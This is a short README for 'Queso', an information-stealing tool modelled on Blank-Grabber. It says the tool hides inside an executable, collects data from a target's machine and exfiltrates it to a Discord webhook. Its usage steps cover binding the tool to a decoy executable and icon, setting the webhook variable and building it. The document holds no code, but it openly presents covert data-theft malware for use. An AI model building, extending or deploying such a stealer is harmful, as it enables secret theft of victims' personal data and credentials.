
# Queso

*Everything's better with a little cheese*

## Description

Queso is an information gathering tool inspired by [Blank-Grabber](https://github.com/Blank-c/Blank-Grabber). It is designed to disguise itself inside an executable file and collect data on a target's machine. Collected data is sent to a Discord webhook.

## Usage

Before running, ensure that the files `bound.exe` and `icon.ico` exist in the `bound/` folder.

Also ensure that you've properly set `DISCORD_WEBHOOK` in your environment variables. Restart your IDE upon doing so.

```
.\run.bat
.\dist\build.exe
```